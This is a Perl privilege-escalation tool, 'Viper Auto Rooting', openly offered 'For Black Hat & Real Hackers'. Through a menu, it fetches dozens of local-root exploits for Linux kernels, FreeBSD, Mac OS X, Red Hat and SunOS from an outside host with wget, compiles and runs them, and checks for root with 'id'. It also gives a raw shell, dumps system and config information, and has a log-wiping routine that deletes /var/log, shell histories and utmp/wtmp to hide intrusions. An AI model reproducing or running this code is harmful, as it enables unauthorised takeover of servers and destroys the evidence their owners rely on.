#!/usr/bin/perl
#
#		==>> Viper Auto Rooting <<==
#
#
#	---------------------------------------------------------------------------------------------------------------------------
#	Script : Perl
#	By : Bl4ck.Viper
#	From : Azarbycan (Turkish Man)(fardin Allahverdinajhand)
#	Contact : Bl4ck.Viper@Gmail.Com , Bl4ck.Viper@Hotmail.Com , Bl4ck.Viper@Yahoo.Com
#	Version : 2.0
#	For Black Hat & Real Hackers
#	---------------------------------------------------------------------------------------------------------------------------	
#	---------------------------------------------------------------------------------------------------------------------------
#	For All Version Of Linux , SunOS , MacOS X , FreeBSD
#	---------------------------------------------------------------------------------------------------------------------------
#	


print "\t\t\tViper Auto Rooting\n";
print "\t\t\tVersion : 2.0\n";
print "\n";
print "\n\n";
print "\t\t------------------------------------\n";
print "\t\t\tCoded By Bl4ck.Viper\n";
print "\t\t------------------------------------\n";
print "\t\t For See Commands type [help] :D\n";
print "\n";
command:;
print 'Viper@Localr00t#:';
$command = <STDIN>;
	
if ($command =~ /help/){
goto help
}
if ($command =~ /sysline/){
goto sysline
}
if ($command =~ /varline/){
goto varline
}
if ($command =~ /gccinfo/){
goto gccinfo
}
if ($command =~ /sysinfo/){
goto sysinfo
}
if ($command =~ /logc/){
goto logc
}
if ($command =~ /config/){
goto config
}
if ($command =~ /logs/){
goto logs
}
if ($command =~ /sysproc/){
goto sysproc
}
if ($command =~ /all/){
goto all
}
if ($command =~ /2.2.x/){
goto local2
}
if ($command =~ /2.4.x/){
goto local4
}
if ($command =~ /2.6.x/){
goto local6
}
if ($command =~ /freebsd-x/){
goto freebsd
}
if ($command =~ /mac-os-x/){
goto mac
}
if ($command =~ /red-x/){
goto red
}
if ($command =~ /sunos-x/){
goto sun
}

else{
print "Unknow Command !\n";
goto command
};
		


help:;
print "\t--------------------------------------------------------\n";
print "\t\tsysline\t\t[Go To System Command Line]\n";
print "\t\tvarline\t\t[Go To var.pl Command Line]\n";
print "\t\tsysinfo\t\t[Show System Information]\n";
print "\t\tsysproc\t\t[Show Running Proccess's]\n";
print "\t\tconfig\t\t[Show Config File]\n";
print "\t\tlogs\t\t[Show System Log File]\n";
print "\t\tall\t\t[Show All Localroots In Database]\n";
print "\t\tgccinfo\t\t[Check For gcc Installed Or Not Installed]\n";
print "\t\tlogc\t\t[Clear Server Log]\n";
print "\t\t2.2.x\t\t[Localroots of 2.2.x]\n";
print "\t\t2.4.x\t\t[Localroots of 2.4.x]\n";
print "\t\t2.6.x\t\t[Localroots of 2.6.x]\n";
print "\t\tfreebsd-x\t[Localroots of FreeBSD]\n";
print "\t\tmac-os-x\t[Localroots of MacOS X]\n";
print "\t\tred-x\t\t[Localroots of RedHat]\n";
print "\t\tsunos-x\t\t[Localroots of Sun Solaris OS]\n";
print "\t--------------------------------------------------------\n";
print "\n";
goto command;
sysline:;
print "system:";
$systemm = <>;

if ($systemm =~ /varline/){
goto varline
}
system("$systemm");
goto sysline;
varline:;
goto command;
all:;
print q{
2.2.27
2.2.x
2.4 2.6
2.4.17
2.4.18
2.4.19
2.4.20
2.4.21
2.4.22
2.4.22-10
2.4.23
2.4.24
2.4.25
2.4.26
2.4.29
2.4.x
2.6.2
2.6.4
2.6.5
2.6.7
2.6.8
2.6.9
2.6.9-22.sh
2.6.9-34
2.6.9-55
2.6.10
2.6.11
2.6.12
2.6.13
2.6.13-17-2
2.6.13-17-3
2.6.14
2.6.15
2.6.16
2.6.17
2.6.x
FreeBSD 4.4 - 4.6
FreeBSD 4.8
FreeBSD 5.3
Mac OS X
red-7.3
red-8.0
red-hat8.0-2
redhat 7.0
redhat 7.1
SunOS 5.7
SunOS 5.8
SunOS 5.9
SunOS 5.10
};
print "\n";
goto command;
local2:;
print "\t\tWelcome To 2.2.x Section\n";
system ("cd /tmp;mkdir 2.2.x;chmod 777 2.2.x;cd 2.2.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.2.x/elfcd1.c;gcc elfcd1.c -o elfcd1;chmod 777 elfcd1;./elfcd1");
system ("cd /tmp;mkdir 2.2.x;chmod 777 2.2.x;cd 2.2.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.2.x/mremap_pte;chmod 777 mremap_pte;./mremap_pte");
system ("cd /tmp;mkdir 2.2.x;chmod 777 2.2.x;cd 2.2.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.2.x/uselib24;chmod 777 uselib24;./uselib24");
system ("cd /tmp;mkdir 2.2.x;chmod 777 2.2.x;cd 2.2.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.2.x/ptrace24;chmod 777 ptrace24;./ptrace24");
system ("id");
local4:;
system ("cd /tmp;mkdir 2.4.x;chmod 777 2.4.x;cd 2.4.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.4.x/pwned.c;gcc pwned.c -o pwned;chmod 777 pwned;./pwned");
system ("cd /tmp;mkdir 2.4.x;chmod 777 2.4.x;cd 2.4.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.4.x/kmod;chmod 777 kmod;./kmod");
system ("cd /tmp;mkdir 2.4.x;chmod 777 2.4.x;cd 2.4.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.4.x/newlocal;chmod 777 newlocal;./newlocal");
system ("cd /tmp;mkdir 2.4.x;chmod 777 2.4.x;cd 2.4.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.4.x/uselib24;chmod 777 uselib24;./uselib24");
system ("cd /tmp;mkdir 2.4.x;chmod 777 2.4.x;cd 2.4.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.4.x/brk;chmod 777 brk;./brk");
system ("cd /tmp;mkdir 2.4.x;chmod 777 2.4.x;cd 2.4.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.4.x/brk2;chmod 777 brk2;./brk2");
system ("cd /tmp;mkdir 2.4.x;chmod 777 2.4.x;cd 2.4.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.4.x/ptrace;chmod 777 ptrace;./ptrace");
system ("cd /tmp;mkdir 2.4.x;chmod 777 2.4.x;cd 2.4.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.4.x/ptrace-kmod;chmod 777 ptrace-kmod;./ptrace-kmod");
system ("cd /tmp;mkdir 2.4.x;chmod 777 2.4.x;cd 2.4.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.4.x/2.4.22.c;gcc 2.4.22.c -o 2.4.22;chmod 777 2.4.22;./2.4.22");
system ("cd /tmp;mkdir 2.4.x;chmod 777 2.4.x;cd 2.4.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.4.x/loginx;chmod 777 loginx;./loginx");
system ("cd /tmp;mkdir 2.4.x;chmod 777 2.4.x;cd 2.4.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.4.x/hatorihanzo.c;gcc hatorihanzo.c -o hatorihanzo;chmod 777 hatorihanzo;./hatorihanzo");
system ("cd /tmp;mkdir 2.4.x;chmod 777 2.4.x;cd 2.4.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.4.x/mremap_pte;chmod 777 mremap_pte;./mremap_pte");
system ("cd /tmp;mkdir 2.4.x;chmod 777 2.4.x;cd 2.4.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.4.x/Linux-kernel-mremap.c;gcc Linux-kernel-mremap.c -o Linux-kernel-mremap;chmod 777 Linux-kernel-mremap;./Linux-kernel-mremap");
system ("cd /tmp;mkdir 2.4.x;chmod 777 2.4.x;cd 2.4.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.4.x/uselib24;chmod 777 uselib24;./uselib24");
system ("cd /tmp;mkdir 2.4.x;chmod 777 2.4.x;cd 2.4.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.4.x/expand_stack.c;gcc expand_stack.c -o expand_stack;chmod 777 expand_stack;./expand_stack");
system ("cd /tmp;mkdir 2.4.x;chmod 777 2.4.x;cd 2.4.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.4.x/elflbl;chmod 777 elflbl;./elflbl");
system ("id");
local6:;
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/h00lyshit;chmod 777 h00lyshit;./h00lyshit");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/krad;chmod 777 krad;./krad");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/myptrace;chmod 777 myptrace;./myptrace");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/hudo.c;gcc hudo.c -o hudo;chmod 777 hudo;./hudo");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/05;chmod 777 05;./05");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/krad2;chmod 777 krad2;./krad2");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/ong_bak.c;gcc ong_bak.c -o ong_bak;chmod 777 ong_bak;./ong_bak");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/2.6.9-55-2007-prv8;chmod 777 2.6.9-55-2007-prv8;./2.6.9-55-2007-prv8");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/04;chmod 777 04;./04");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/06;chmod 777 06;./06");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/r00t;chmod 777 r00t;./r00t");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/uselib24.c;gcc uselib24.c -o uselib24;chmod 777 uselib24;./uselib24");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/2.6.11.c;gcc 2.6.11.c -o 2.6.11;chmod 777 2.6.11;./2.6.11");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/k-rad.c;gcc k-rad.c -o k-rad;chmod 777 k-rad;./k-rad");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/k-rad3;chmod 777 k-rad3;./k-rad3");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/pwned;chmod 777 pwned;./pwned");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/binfmt_elf.c;gcc binfmt_elf.c -o binfmt_elf;chmod 777 binfmt_elf;./binfmt_elf");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/elfcd2.c;gcc elfcd2.c -o elfcd2;chmod 777 elfcd2;./elfcd2");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/prct1;chmod 777 prct1;./prct1");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/prct2;chmod 777 prct2;./prct2");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/prct3;chmod 777 prct3;./prct3");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/prct4;chmod 777 prct4;./prct4");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/prct6;chmod 777 prct6;./prct6");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/raptor;chmod 777 raptor;./raptor");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/2.6.17;chmod 777 2.6.17;./2.6.17");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/prct5.sh;chmod 777 prct5.sh;./prct5.sh");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/root;chmod 777 root;./root");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/cw7.3;chmod 777 cw7.3;./cw7.3");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/x;chmod 777 x;./x");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/x2;chmod 777 x2;./x2");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/exp.sh;chmod 777 exp.sh;./exp.sh");
system ("cd /tmp;mkdir 2.6.x;chmod 777 2.6.x;cd 2.6.x;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/2.6.x/root2;chmod 777 root2;./root2");
system ("id");
freebsd:;
system ("cd /tmp;mkdir freebsd;chmod 777 freebsd;cd freebsd;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/freebsd/bsd;chmod 777 bsd;./bsd");
system ("cd /tmp;mkdir freebsd;chmod 777 freebsd;cd freebsd;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/freebsd/48local;chmod 777 48local;./48local");
system ("cd /tmp;mkdir freebsd;chmod 777 freebsd;cd freebsd;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/freebsd/exploit;chmod 777 exploit;./exploit");
system ("cd /tmp;mkdir freebsd;chmod 777 freebsd;cd freebsd;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/freebsd/freedbs5.3;chmod 777 freedbs5.3;./freedbs5.3");
system ("id");
mac:;
system ("cd /tmp;mkdir mac;chmod 777 mac;cd mac;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/mac/macosX;chmod 777 macosX;./macosX");
system ("id");
red:;
system ("cd /tmp;mkdir red;chmod 777 red;cd red;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/red/afd-expl.c;gcc afd-expl.c -o afd-expl;chmod 777 afd-expl;./afd-expl");
system ("cd /tmp;mkdir red;chmod 777 red;cd red;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/red/alsaplayer-suid.c;gcc alsaplayer-suid.c -o alsaplayer-suid;chmod 777 alsaplayer-suid;./alsaplayer-suid");
system ("cd /tmp;mkdir red;chmod 777 red;cd red;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/red/nslconf.c;gcc nslconf.c -o nslconf;chmod 777 nslconf;./nslconf");
system ("cd /tmp;mkdir red;chmod 777 red;cd red;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/red/ohMy-another-efs;chmod 777 ohMy-another-efs;./ohMy-another-efs");
system ("cd /tmp;mkdir red;chmod 777 red;cd red;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/red/0x82-Remote.tannehehe.xpl.c;gcc 0x82-Remote.tannehehe.xpl.c -o 0x82-Remote.tannehehe.xpl;chmod 777 0x82-Remote.tannehehe.xpl;./0x82-Remote.tannehehe.xpl");
system ("cd /tmp;mkdir red;chmod 777 red;cd red;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/red/efs_local;chmod 777 efs_local;./efs_local");
system ("cd /tmp;mkdir red;chmod 777 red;cd red;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/red/ifenslave;chmod 777 ifenslave;./ifenslave");
system ("cd /tmp;mkdir red;chmod 777 red;cd red;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/red/crontab.c;gcc crontab.c -o crontab;chmod 777 crontab;./crontab");
system ("cd /tmp;mkdir red;chmod 777 red;cd red;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/red/epcs2.c;gcc epcs2.c -o epcs2;chmod 777 epcs2;./epcs2");
system ("cd /tmp;mkdir red;chmod 777 red;cd red;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/red/rh71sm8.c;gcc rh71sm8.c -o rh71sm8;chmod 777 rh71sm8;./rh71sm8");
system ("id");
sun:;
system ("cd /tmp;mkdir sun;chmod 777 sun;cd sun;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/sun/solaris27;chmod 777 solaris27;./solaris27");
system ("cd /tmp;mkdir sun;chmod 777 sun;cd sun;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/sun/final;chmod 777 final;./final");
system ("cd /tmp;mkdir sun;chmod 777 sun;cd sun;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/sun/sunos59;chmod 777 sunos59;./sunos59");
system ("cd /tmp;mkdir sun;chmod 777 sun;cd sun;wget http://www.bl4ck-viper.persiangig.com/p8/localroots/sun/sunos510.c;gcc sunos510.c -o sunos510;chmod 777 sunos510;./sunos510");
system ("id");
sysinfo:;
	system ("dmesg");
		print "\n\n";
			system ("set");
				print "\n\n";
					system ("uname -a");
						print "\n\n";
							system ("uname -r");
						print "\n\n";
					system ("ifconfig");
				print "\n\n";
			goto command;
gccinfo:;
	system ("locate gcc");
		print "\n\n";
			goto command;
sysproc:;
	system ("ps aux");
		print "\n\n";
			goto command;
logc:;
system ("rm -rf /tmp/logs");
system ("rm -rf $HISTFILE");
system ("rm -rf /root/.ksh_history");
system ("rm -rf /root/.bash_history");
system ("rm -rf /root/.bash_logout");
system ("rm -rf /usr/local/apache/logs");
sleep(2);
system ("rm -rf /usr/local/apache/log");
system ("rm -rf /var/apache/logs");
system ("rm -rf /var/apache/log");
system ("rm -rf /var/run/utmp");
system ("rm -rf /var/logs");
system ("rm -rf /var/log");
sleep(2);
system ("rm -rf /var/adm");
system ("rm -rf /etc/wtmp");
system ("rm -rf /etc/utmp");
print "\n";
print "Done!";
goto command;
logs:;
print "\n";
	system ("cat /etc/syslog.conf");
		print "\n\n";
	goto command;
config:;
print "\n";
	system ("cat ./../mainfile.php");
		print "\n\n";
	goto command;
